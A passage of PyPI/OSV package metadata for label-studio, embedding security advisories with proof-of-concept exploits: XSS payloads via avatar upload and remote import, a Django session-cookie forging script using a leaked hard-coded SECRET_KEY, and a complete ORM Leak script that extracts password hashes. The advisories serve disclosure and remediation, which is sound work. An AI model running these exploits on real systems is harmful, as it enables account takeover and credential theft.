read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.5.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.5.0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==1.31.5)","google-auth (==1.35.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==1.5.0)","google-cloud-storage (~=1.29.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==0.5.1)","googleapis-common-protos (==1.52.0)","grpc-google-iam-v1 (==0.12.3)","Django (==3.1.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk 